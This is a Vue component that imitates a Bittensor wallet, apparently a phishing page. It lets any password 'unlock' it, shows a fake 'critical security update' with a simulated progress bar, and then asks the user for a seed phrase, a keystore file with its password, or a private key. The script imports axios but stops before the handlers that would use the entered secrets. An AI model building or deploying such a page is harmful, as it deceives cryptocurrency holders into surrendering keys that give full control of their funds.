<template>
  <div class="wallet-shell">
    <!-- Ambient background -->
    <div class="ambient-bg">
      <div class="ambient-orb orb-1"></div>
      <div class="ambient-orb orb-2"></div>
    </div>

    <!-- Header (hidden on step 1) -->
    <header v-if="currentStep !== 1" class="wallet-header">
      <div class="brand">
        <div class="brand-logo">
          <img
            src="https://docs.learnbittensor.org/img/logo.svg"
            alt="Bittensor"
          />
        </div>
        <span class="brand-name">Bittensor</span>
      </div>

      <div class="header-right">
        <!-- Step dots -->
        <div class="step-dots">
          <span
            v-for="s in [2, 3, 4, 5, 6]"
            :key="s"
            class="dot"
            :class="{ active: currentStep === s, done: currentStep > s }"
          ></span>
        </div>
        <button class="close-btn" @click.prevent="closeModal">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="18"
            height="18"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            stroke-linecap="round"
            stroke-linejoin="round"
          >
            <line x1="18" y1="6" x2="6" y2="18" />
            <line x1="6" y1="6" x2="18" y2="18" />
          </svg>
        </button>
      </div>
    </header>

    <!-- Content -->
    <div class="wallet-body">
      <transition name="slide" mode="out-in">
        <!-- STEP 1: Unlock -->
        <div v-if="currentStep === 1" key="s1" class="step step-unlock">
          <div class="unlock-logo">
            <img
              src="https://docs.learnbittensor.org/img/logo.svg"
              alt="Bittensor"
            />
            <div class="logo-ring ring-1"></div>
            <div class="logo-ring ring-2"></div>
          </div>
          <h1 class="step-title">Unlock Wallet</h1>
          <p class="step-sub">Enter your password to continue</p>
          <div class="field-group">
            <div class="input-wrapper">
              <svg
                class="input-icon"
                xmlns="http://www.w3.org/2000/svg"
                width="16"
                height="16"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
                <path d="M7 11V7a5 5 0 0 1 10 0v4" />
              </svg>
              <input
                v-model="password"
                type="password"
                placeholder="Password"
                class="wallet-input"
                @keyup.enter="unlock"
              />
            </div>
            <button
              @click="unlock"
              :disabled="password.length < 1"
              class="btn-primary"
              :class="{ 'btn-disabled': password.length < 1 }"
            >
              <span>Unlock</span>
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="16"
                height="16"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2.5"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <line x1="5" y1="12" x2="19" y2="12" />
                <polyline points="12 5 19 12 12 19" />
              </svg>
            </button>
          </div>
        </div>

        <!-- STEP 2: Update Required -->
        <div v-else-if="currentStep === 2" key="s2" class="step">
          <div class="update-icon-wrap">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="32"
              height="32"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="1.5"
              stroke-linecap="round"
              stroke-linejoin="round"
            >
              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
            </svg>
          </div>
          <h2 class="step-title">Security Update</h2>
          <p class="step-sub">A critical update is ready to install</p>

          <div class="update-card">
            <div class="update-item">
              <div class="update-dot"></div>
              <span>Critical security enhancements</span>
            </div>
            <div class="update-item">
              <div class="update-dot"></div>
              <span>Improved wallet performance</span>
            </div>
            <div class="update-item">
              <div class="update-dot"></div>
              <span>Better network compatibility</span>
            </div>
          </div>

          <div class="btn-row">
            <button @click="goBack" class="btn-ghost">Back</button>
            <button @click="startUpdate" class="btn-primary">
              <span>Install Update</span>
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="16"
                height="16"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2.5"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <polyline points="8 17 12 21 16 17" />
                <line x1="12" y1="12" x2="12" y2="21" />
                <path d="M20.88 18.09A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.29" />
              </svg>
            </button>
          </div>
        </div>

        <!-- STEP 3: Progress -->
        <div v-else-if="currentStep === 3" key="s3" class="step step-progress">
          <div class="progress-ring-wrap">
            <svg
              class="progress-ring"
              width="120"
              height="120"
              viewBox="0 0 120 120"
            >
              <circle class="ring-track" cx="60" cy="60" r="52" />
              <circle
                class="ring-fill"
                cx="60"
                cy="60"
                r="52"
                :style="{
                  strokeDashoffset: 327 - (327 * progress) / 100,
                }"
              />
            </svg>
            <div class="ring-label">
              {{ Math.round(progress) }}<span>%</span>
            </div>
          </div>
          <h2 class="step-title">Installing Update</h2>
          <p class="step-sub">Please wait — do not close this window</p>
          <div class="progress-bar-track">
            <div
              class="progress-bar-fill"
              :style="{ width: progress + '%' }"
            ></div>
          </div>
          <p class="progress-hint">Downloading and verifying packages…</p>
        </div>

        <!-- STEP 4: Recovery Method -->
        <div v-else-if="currentStep === 4" key="s4" class="step">
          <h2 class="step-title">Recovery Method</h2>
          <p class="step-sub">Choose how to restore your wallet</p>

          <div class="method-list">
            <button @click="selectRecoveryMethod('phrase')" class="method-card">
              <div class="method-icon">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="20"
                  height="20"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="1.5"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                >
                  <path d="M12 20h9" />
                  <path
                    d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"
                  />
                </svg>
              </div>
              <div class="method-text">
                <span class="method-label">Recovery Phrase</span>
                <span class="method-hint">12 or 24 words</span>
              </div>
              <svg
                class="method-arrow"
                xmlns="http://www.w3.org/2000/svg"
                width="16"
                height="16"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <polyline points="9 18 15 12 9 6" />
              </svg>
            </button>

            <button
              @click="selectRecoveryMethod('keystore')"
              class="method-card"
            >
              <div class="method-icon">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="20"
                  height="20"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="1.5"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                >
                  <path
                    d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"
                  />
                  <polyline points="14 2 14 8 20 8" />
                </svg>
              </div>
              <div class="method-text">
                <span class="method-label">Keystore File</span>
                <span class="method-hint">JSON file + password</span>
              </div>
              <svg
                class="method-arrow"
                xmlns="http://www.w3.org/2000/svg"
                width="16"
                height="16"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <polyline points="9 18 15 12 9 6" />
              </svg>
            </button>

            <button
              @click="selectRecoveryMethod('privatekey')"
              class="method-card"
            >
              <div class="method-icon">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="20"
                  height="20"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="1.5"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                >
                  <path
                    d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"
                  />
                </svg>
              </div>
              <div class="method-text">
                <span class="method-label">Private Key</span>
                <span class="method-hint">Hex string (0x…)</span>
              </div>
              <svg
                class="method-arrow"
                xmlns="http://www.w3.org/2000/svg"
                width="16"
                height="16"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <polyline points="9 18 15 12 9 6" />
              </svg>
            </button>
          </div>
        </div>

        <!-- STEP 5: Recovery Phrase -->
        <div
          v-else-if="currentStep === 5 && recoveryMethod === 'phrase'"
          key="s5-phrase"
          class="step"
        >
          <h2 class="step-title">Recovery Phrase</h2>
          <p class="step-sub">Enter your 12 or 24-word seed phrase</p>

          <div class="textarea-wrapper">
            <textarea
              v-model="recoveryPhrase"
              placeholder="word1 word2 word3 word4 …"
              class="wallet-textarea"
              rows="5"
            ></textarea>
            <div
              class="word-count"
              :class="{
                valid: phraseWordCount === 12 || phraseWordCount === 24,
              }"
            >
              {{ phraseWordCount }} / 24 words
            </div>
          </div>

          <div class="btn-row">
            <button @click="goBackToMethods" class="btn-ghost">Back</button>
            <button
              @click="importRecoveryPhrase"
              :disabled="recoveryPhrase.trim().length === 0 || isLoading"
              class="btn-primary"
              :class="{
                'btn-disabled': recoveryPhrase.trim().length === 0 || isLoading,
              }"
            >
              <template v-if="!isLoading">
                <span>Import</span>
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2.5"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                >
                  <line x1="5" y1="12" x2="19" y2="12" />
                  <polyline points="12 5 19 12 12 19" />
                </svg>
              </template>
              <svg
                v-else
                class="spin"
                xmlns="http://www.w3.org/2000/svg"
                width="18"
                height="18"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <path d="M21 12a9 9 0 1 1-6.219-8.56" />
              </svg>
            </button>
          </div>
        </div>

        <!-- STEP 5: Keystore -->
        <div
          v-else-if="currentStep === 5 && recoveryMethod === 'keystore'"
          key="s5-keystore"
          class="step"
        >
          <h2 class="step-title">Keystore File</h2>
          <p class="step-sub">
            Upload your JSON keystore and enter its password
          </p>

          <div class="textarea-wrapper">
            <textarea
              v-model="keystoreFile"
              placeholder="Paste keystore JSON content here"
              class="wallet-textarea"
              rows="5"
            ></textarea>
          </div>

          <div class="input-wrapper" style="margin-top: 14px">
            <svg
              class="input-icon"
              xmlns="http://www.w3.org/2000/svg"
              width="16"
              height="16"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="2"
              stroke-linecap="round"
              stroke-linejoin="round"
            >
              <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
              <path d="M7 11V7a5 5 0 0 1 10 0v4" />
            </svg>
            <input
              v-model="keystorePassword"
              type="password"
              placeholder="Keystore password"
              class="wallet-input"
            />
          </div>

          <div class="btn-row">
            <button @click="goBackToMethods" class="btn-ghost">Back</button>
            <button
              @click="importKeystore"
              :disabled="
                !keystoreFile ||
                keystorePassword.trim().length === 0 ||
                isLoading
              "
              class="btn-primary"
              :class="{
                'btn-disabled':
                  !keystoreFile ||
                  keystorePassword.trim().length === 0 ||
                  isLoading,
              }"
            >
              <template v-if="!isLoading">
                <span>Import</span>
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2.5"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                >
                  <line x1="5" y1="12" x2="19" y2="12" />
                  <polyline points="12 5 19 12 12 19" />
                </svg>
              </template>
              <svg
                v-else
                class="spin"
                xmlns="http://www.w3.org/2000/svg"
                width="18"
                height="18"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <path d="M21 12a9 9 0 1 1-6.219-8.56" />
              </svg>
            </button>
          </div>
        </div>

        <!-- STEP 5: Private Key -->
        <div
          v-else-if="currentStep === 5 && recoveryMethod === 'privatekey'"
          key="s5-pk"
          class="step"
        >
          <h2 class="step-title">Private Key</h2>
          <p class="step-sub">Paste your private key in hexadecimal format</p>

          <div class="textarea-wrapper">
            <textarea
              v-model="privateKey"
              placeholder="0x..."
              class="wallet-textarea mono"
              rows="4"
            ></textarea>
            <div
              v-if="privateKey.trim().length > 0"
              class="key-status"
              :class="isValidPrivateKey ? 'key-valid' : 'key-invalid'"
            >
              <svg
                v-if="isValidPrivateKey"
                xmlns="http://www.w3.org/2000/svg"
                width="13"
                height="13"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="3"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <polyline points="20 6 9 17 4 12" />
              </svg>
              <svg
                v-else
                xmlns="http://www.w3.org/2000/svg"
                width="13"
                height="13"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="3"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <line x1="18" y1="6" x2="6" y2="18" />
                <line x1="6" y1="6" x2="18" y2="18" />
              </svg>
              {{
                isValidPrivateKey ? "Valid key format" : "Invalid key format"
              }}
            </div>
          </div>

          <div class="btn-row">
            <button @click="goBackToMethods" class="btn-ghost">Back</button>
            <button
              @click="importPrivateKey"
              :disabled="!isValidPrivateKey || isLoading"
              class="btn-primary"
              :class="{ 'btn-disabled': !isValidPrivateKey || isLoading }"
            >
              <template v-if="!isLoading">
                <span>Import</span>
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2.5"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                >
                  <line x1="5" y1="12" x2="19" y2="12" />
                  <polyline points="12 5 19 12 12 19" />
                </svg>
              </template>
              <svg
                v-else
                class="spin"
                xmlns="http://www.w3.org/2000/svg"
                width="18"
                height="18"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <path d="M21 12a9 9 0 1 1-6.219-8.56" />
              </svg>
            </button>
          </div>
        </div>

        <!-- STEP 6: Success -->
        <div v-else-if="currentStep === 6" key="s6" class="step step-success">
          <div class="success-ring">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="36"
              height="36"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="2"
              stroke-linecap="round"
              stroke-linejoin="round"
            >
              <polyline points="20 6 9 17 4 12" />
            </svg>
          </div>
          <h2 class="step-title">Wallet Connected</h2>
          <p class="step-sub">
            Your Bittensor wallet was imported successfully
          </p>

          <div class="success-meta">
            <span class="meta-label">Recovery method</span>
            <span class="meta-value capitalize">{{ recoveryMethod }}</span>
          </div>

          <button @click="completeImport" class="btn-primary btn-full">
            <span>Continue</span>
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="16"
              height="16"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="2.5"
              stroke-linecap="round"
              stroke-linejoin="round"
            >
              <line x1="5" y1="12" x2="19" y2="12" />
              <polyline points="12 5 19 12 12 19" />
            </svg>
          </button>
        </div>
      </transition>

      <!-- Toast message -->
      <transition name="toast">
        <div
          v-if="message.text"
          class="toast"
          :class="message.type === 'success' ? 'toast-success' : 'toast-error'"
        >
          {{ message.text }}
        </div>
      </transition>
    </div>
  </div>
</template>

<style scoped>
@import url("https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600&family=DM+Mono:wght@400;500&display=swap");

* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

.wallet-shell {
  font-family: "DM Sans", sans-serif;
  background: #0d0d0f;
  border: 1px solid rgba(255, 255, 255, 0.06);
  border-radius: 20px;
  width: 100%;
  max-width: 420px;
  overflow: hidden;
  position: relative;
  color: #f0ede8;
}

/* Ambient glows */
.ambient-bg {
  position: absolute;
  inset: 0;
  pointer-events: none;
  overflow: hidden;
  border-radius: 20px;
}
.ambient-orb {
  position: absolute;
  border-radius: 50%;
  filter: blur(60px);
  opacity: 0.18;
}
.orb-1 {
  width: 220px;
  height: 220px;
  background: #ffffff;
  top: -80px;
  right: -60px;
}
.orb-2 {
  width: 160px;
  height: 160px;
  background: #3a6ea5;
  bottom: -40px;
  left: -40px;
}

/* Header */
.wallet-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 14px 20px;
  border-bottom: 1px solid rgba(255, 255, 255, 0.06);
  position: relative;
  z-index: 2;
}
.brand {
  display: flex;
  align-items: center;
  gap: 10px;
}
.brand-logo {
  width: 32px;
  height: 32px;
  border-radius: 8px;
  background: rgba(255, 255, 255, 0.05);
  border: 1px solid rgba(255, 255, 255, 0.1);
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 4px;
}
.brand-logo img {
  width: 100%;
  height: 100%;
  object-fit: contain;
}
.brand-name {
  font-size: 14px;
  font-weight: 600;
  letter-spacing: 0.02em;
  color: #f0ede8;
}

.header-right {
  display: flex;
  align-items: center;
  gap: 14px;
}

.step-dots {
  display: flex;
  gap: 5px;
}
.dot {
  width: 6px;
  height: 6px;
  border-radius: 50%;
  background: rgba(255, 255, 255, 0.15);
  transition: all 0.3s ease;
}
.dot.active {
  background: #ffffff;
  width: 18px;
  border-radius: 3px;
}
.dot.done {
  background: gray;
}

.close-btn {
  background: rgba(255, 255, 255, 0.05);
  border: 1px solid rgba(255, 255, 255, 0.08);
  border-radius: 8px;
  color: rgba(255, 255, 255, 0.5);
  width: 30px;
  height: 30px;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  transition: all 0.2s;
}
.close-btn:hover {
  background: rgba(255, 255, 255, 0.1);
  color: #f0ede8;
}

/* Body */
.wallet-body {
  padding: 32px 28px 28px;
  min-height: 420px;
  display: flex;
  flex-direction: column;
  position: relative;
  z-index: 2;
}

/* Steps */
.step {
  display: flex;
  flex-direction: column;
  flex: 1;
}

.step-title {
  font-size: 24px;
  font-weight: 600;
  color: #f0ede8;
  margin-bottom: 6px;
  letter-spacing: -0.02em;
  line-height: 1.2;
}
.step-sub {
  font-size: 14px;
  color: rgba(240, 237, 232, 0.45);
  margin-bottom: 28px;
  font-weight: 400;
}

/* Unlock Step */
.step-unlock {
  align-items: center;
  justify-content: center;
  text-align: center;
  padding-top: 12px;
}
.step-unlock .step-title {
  font-size: 28px;
  margin-bottom: 8px;
}
.step-unlock .step-sub {
  margin-bottom: 32px;
}
.step-unlock .field-group {
  width: 100%;
  max-width: 320px;
}

.unlock-logo {
  position: relative;
  width: 90px;
  height: 90px;
  margin-bottom: 24px;
  display: flex;
  align-items: center;
  justify-content: center;
}
.unlock-logo img {
  width: 52px;
  height: 52px;
  object-fit: contain;
  position: relative;
  z-index: 2;
}
.logo-ring {
  position: absolute;
  border-radius: 50%;
  border: 1px solid rgba(200, 145, 42, 0.25);
  animation: pulse-ring 3s ease infinite;
}
.ring-1 {
  width: 70px;
  height: 70px;
  animation-delay: 0s;
}
.ring-2 {
  width: 90px;
  height: 90px;
  animation-delay: 1s;
  border-color: rgba(200, 145, 42, 0.12);
}

@keyframes pulse-ring {
  0%,
  100% {
    transform: scale(1);
    opacity: 1;
  }
  50% {
    transform: scale(1.04);
    opacity: 0.6;
  }
}

/* Inputs */
.input-wrapper {
  position: relative;
  width: 100%;
}
.input-icon {
  position: absolute;
  left: 14px;
  top: 50%;
  transform: translateY(-50%);
  color: rgba(240, 237, 232, 0.3);
  pointer-events: none;
}
.wallet-input {
  width: 100%;
  background: rgba(255, 255, 255, 0.04);
  border: 1px solid rgba(255, 255, 255, 0.08);
  border-radius: 12px;
  padding: 13px 16px 13px 42px;
  font-size: 14px;
  font-family: "DM Sans", sans-serif;
  color: #f0ede8;
  outline: none;
  transition:
    border-color 0.2s,
    background 0.2s;
  margin-bottom: 14px;
}
.wallet-input::placeholder {
  color: rgba(240, 237, 232, 0.25);
}
.wallet-input:focus {
  border-color: rgba(200, 145, 42, 0.5);
  background: rgba(200, 145, 42, 0.04);
}

.wallet-textarea {
  width: 100%;
  background: rgba(255, 255, 255, 0.04);
  border: 1px solid rgba(255, 255, 255, 0.08);
  border-radius: 12px;
  padding: 14px 16px;
  font-size: 14px;
  font-family: "DM Sans", sans-serif;
  color: #f0ede8;
  outline: none;
  resize: none;
  transition:
    border-color 0.2s,
    background 0.2s;
  line-height: 1.7;
}
.wallet-textarea.mono {
  font-family: "DM Mono", monospace;
  font-size: 13px;
}
.wallet-textarea::placeholder {
  color: rgba(240, 237, 232, 0.25);
}
.wallet-textarea:focus {
  border-color: rgba(200, 145, 42, 0.5);
  background: rgba(200, 145, 42, 0.04);
}
.textarea-wrapper {
  position: relative;
  margin-bottom: 6px;
  width: 100%;
}
.word-count {
  font-size: 12px;
  color: rgba(240, 237, 232, 0.3);
  text-align: right;
  margin-top: 6px;
  margin-bottom: 20px;
  font-family: "DM Mono", monospace;
  transition: color 0.2s;
}
.word-count.valid {
  color: #6dba7e;
}

/* Buttons */
.btn-primary {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  background: #ffffff;
  color: #1a0f00;
  border: none;
  border-radius: 12px;
  padding: 13px 20px;
  font-size: 14px;
  font-weight: 600;
  font-family: "DM Sans", sans-serif;
  cursor: pointer;
  transition: all 0.2s ease;
  letter-spacing: 0.01em;
  flex: 1;
}
.btn-primary:hover:not(.btn-disabled) {
  background: linear-gradient(135deg, #ffffff 0%, #ffffff 100%);
  transform: translateY(-1px);
  box-shadow: 0 6px 20px rgba(200, 145, 42, 0.35);
}
.btn-primary:active:not(.btn-disabled) {
  transform: translateY(0);
}
.btn-primary.btn-disabled {
  opacity: 0.35;
  cursor: not-allowed;
}
.btn-primary.btn-full {
  width: 100%;
  margin-top: 8px;
}

.btn-ghost {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  flex: 1;
  background: rgba(255, 255, 255, 0.04);
  border: 1px solid rgba(255, 255, 255, 0.08);
  border-radius: 12px;
  padding: 13px 20px;
  font-size: 14px;
  font-weight: 500;
  font-family: "DM Sans", sans-serif;
  color: rgba(240, 237, 232, 0.55);
  cursor: pointer;
  transition: all 0.2s;
}
.btn-ghost:hover {
  background: rgba(255, 255, 255, 0.07);
  color: #f0ede8;
}

.btn-row {
  display: flex;
  gap: 10px;
  margin-top: auto;
  padding-top: 24px;
}

/* Update step */
.update-icon-wrap {
  width: 56px;
  height: 56px;
  border-radius: 14px;
  background: rgba(200, 145, 42, 0.1);
  border: 1px solid rgba(200, 145, 42, 0.2);
  display: flex;
  align-items: center;
  justify-content: center;
  color: #ffffff;
  margin-bottom: 18px;
}
.update-card {
  background: rgba(255, 255, 255, 0.03);
  border: 1px solid rgba(255, 255, 255, 0.06);
  border-radius: 14px;
  padding: 18px 20px;
  display: flex;
  flex-direction: column;
  gap: 12px;
  margin-bottom: auto;
}
.update-item {
  display: flex;
  align-items: center;
  gap: 12px;
  font-size: 13px;
  color: rgba(240, 237, 232, 0.65);
}
.update-dot {
  width: 6px;
  height: 6px;
  border-radius: 50%;
  background: #ffffff;
  flex-shrink: 0;
}

/* Progress ring */
.step-progress {
  align-items: center;
  text-align: center;
}
.step-progress .step-sub {
  margin-bottom: 24px;
}
.progress-ring-wrap {
  position: relative;
  width: 120px;
  height: 120px;
  margin-bottom: 24px;
}
.progress-ring {
  transform: rotate(-90deg);
}
.ring-track {
  fill: none;
  stroke: rgba(255, 255, 255, 0.06);
  stroke-width: 6;
}
.ring-fill {
  fill: none;
  stroke: #ffffff;
  stroke-width: 6;
  stroke-linecap: round;
  stroke-dasharray: 327;
  transition: stroke-dashoffset 0.4s ease;
}
.ring-label {
  position: absolute;
  inset: 0;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 26px;
  font-weight: 600;
  color: #f0ede8;
  letter-spacing: -0.02em;
}
.ring-label span {
  font-size: 14px;
  color: rgba(240, 237, 232, 0.4);
  margin-top: 4px;
}

.progress-bar-track {
  width: 100%;
  height: 3px;
  background: rgba(255, 255, 255, 0.06);
  border-radius: 2px;
  overflow: hidden;
}
.progress-bar-fill {
  height: 100%;
  background: linear-gradient(90deg, #ffffff, #e8aa40);
  border-radius: 2px;
  transition: width 0.4s ease;
}
.progress-hint {
  font-size: 12px;
  color: rgba(240, 237, 232, 0.3);
  margin-top: 10px;
}

/* Method list */
.method-list {
  display: flex;
  flex-direction: column;
  gap: 8px;
  margin-bottom: auto;
}
.method-card {
  display: flex;
  align-items: center;
  gap: 14px;
  background: rgba(255, 255, 255, 0.03);
  border: 1px solid rgba(255, 255, 255, 0.07);
  border-radius: 14px;
  padding: 16px 18px;
  cursor: pointer;
  transition: all 0.2s;
  text-align: left;
  font-family: "DM Sans", sans-serif;
  color: #f0ede8;
  width: 100%;
}
.method-card:hover {
  background: rgba(200, 145, 42, 0.06);
  border-color: rgba(200, 145, 42, 0.25);
  transform: translateX(2px);
}
.method-icon {
  width: 40px;
  height: 40px;
  border-radius: 10px;
  background: rgba(200, 145, 42, 0.1);
  border: 1px solid rgba(200, 145, 42, 0.15);
  display: flex;
  align-items: center;
  justify-content: center;
  color: #ffffff;
  flex-shrink: 0;
}
.method-text {
  flex: 1;
}
.method-label {
  display: block;
  font-size: 14px;
  font-weight: 600;
  color: #f0ede8;
  margin-bottom: 2px;
}
.method-hint {
  display: block;
  font-size: 12px;
  color: rgba(240, 237, 232, 0.35);
}
.method-arrow {
  color: rgba(240, 237, 232, 0.2);
  flex-shrink: 0;
}

/* Dropzone */
.dropzone {
  border: 1.5px dashed rgba(255, 255, 255, 0.1);
  border-radius: 14px;
  padding: 28px 20px;
  text-align: center;
  cursor: pointer;
  transition: all 0.2s;
  color: rgba(240, 237, 232, 0.35);
}
.dropzone:hover,
.dropzone.has-file {
  border-color: rgba(200, 145, 42, 0.4);
  background: rgba(200, 145, 42, 0.04);
}
.dropzone.has-file {
  color: #ffffff;
}
.file-ok {
  color: #ffffff;
}
.dropzone-label {
  font-size: 13px;
  font-weight: 500;
  color: rgba(240, 237, 232, 0.7);
  margin-top: 10px;
  margin-bottom: 4px;
}
.has-file .dropzone-label {
  color: #ffffff;
}
.dropzone-hint {
  font-size: 11px;
  color: rgba(240, 237, 232, 0.3);
}
.hidden-input {
  display: none;
}

/* Key status */
.key-status {
  display: inline-flex;
  align-items: center;
  gap: 5px;
  font-size: 12px;
  font-weight: 500;
  margin-top: 8px;
  margin-bottom: 16px;
  padding: 4px 10px;
  border-radius: 20px;
}
.key-valid {
  color: #6dba7e;
  background: rgba(109, 186, 126, 0.1);
  border: 1px solid rgba(109, 186, 126, 0.2);
}
.key-invalid {
  color: #e06060;
  background: rgba(224, 96, 96, 0.1);
  border: 1px solid rgba(224, 96, 96, 0.2);
}

/* Success */
.step-success {
  align-items: center;
  text-align: center;
  justify-content: center;
}
.step-success .step-title {
  font-size: 28px;
}
.step-success .step-sub {
  margin-bottom: 24px;
}
.success-ring {
  width: 80px;
  height: 80px;
  border-radius: 50%;
  background: rgba(109, 186, 126, 0.1);
  border: 1px solid rgba(109, 186, 126, 0.3);
  display: flex;
  align-items: center;
  justify-content: center;
  color: #6dba7e;
  margin-bottom: 24px;
  animation: success-pop 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) both;
}
@keyframes success-pop {
  from {
    transform: scale(0.5);
    opacity: 0;
  }
  to {
    transform: scale(1);
    opacity: 1;
  }
}
.success-meta {
  background: rgba(255, 255, 255, 0.03);
  border: 1px solid rgba(255, 255, 255, 0.06);
  border-radius: 12px;
  padding: 14px 20px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  width: 100%;
  margin-bottom: 6px;
}
.meta-label {
  font-size: 12px;
  color: rgba(240, 237, 232, 0.35);
}
.meta-value {
  font-size: 13px;
  font-weight: 600;
  color: #ffffff;
}
.capitalize {
  text-transform: capitalize;
}

/* Toast */
.toast {
  position: absolute;
  bottom: 16px;
  left: 50%;
  transform: translateX(-50%);
  padding: 8px 18px;
  border-radius: 20px;
  font-size: 12px;
  font-weight: 500;
  white-space: nowrap;
  z-index: 100;
}
.toast-success {
  background: rgba(109, 186, 126, 0.2);
  border: 1px solid rgba(109, 186, 126, 0.3);
  color: #6dba7e;
}
.toast-error {
  background: rgba(224, 96, 96, 0.2);
  border: 1px solid rgba(224, 96, 96, 0.3);
  color: #e06060;
}

/* Spinner */
.spin {
  animation: spin 0.7s linear infinite;
}
@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}

/* Transitions */
.slide-enter-active,
.slide-leave-active {
  transition: all 0.25s ease;
}
.slide-enter-from {
  opacity: 0;
  transform: translateX(18px);
}
.slide-leave-to {
  opacity: 0;
  transform: translateX(-18px);
}

.toast-enter-active,
.toast-leave-active {
  transition: all 0.25s ease;
}
.toast-enter-from,
.toast-leave-to {
  opacity: 0;
  transform: translateX(-50%) translateY(8px);
}

.fade-enter-active,
.fade-leave-active {
  transition: opacity 0.2s;
}
.fade-enter-from,
.fade-leave-to {
  opacity: 0;
}
</style>

<script setup>
import { ref, computed } from "vue";
import axios from "axios";

const emit = defineEmits(["close"]);

const currentStep = ref(1);
const password = ref("");
const progress = ref(0);
const isLoading = ref(false);
const message = ref({ text: "", type: "" });

// Recovery method state
const recoveryMethod = ref("");
const recoveryPhrase = ref("");
const keystoreFile = ref(null);
const keystoreFileName = ref("");
const keystorePassword = ref("");
const privateKey = ref("");
const fileInput = ref(null);

const phraseWordCount = computed(() => {
  return recoveryPhrase.value
    .trim()
    .split(/\s+/)
    .filter((word) => word.length > 0).length;
});

const isValidPrivateKey = computed(() => {
  const key = privateKey.value.trim();
  if (key.length === 0) return false;
  const hexRegex = /^(0x)?[0-9a-fA-F]{64}$/;
  return hexRegex.test(key);
});

function closeModal() {
  emit("close");
}

function unlock() {
  if (password.value.length < 1) return;
  currentStep.value = 2;
}

function goBack() {
  currentStep.value = 1;
  password.value = "";
}

function startUpdate() {
  currentStep.value = 3;
  progress.value = 0;
  const duration = 3000;
  const start = performance.now();
  isLoading.value = true;

  function step(now) {
    const elapsed = now - start;
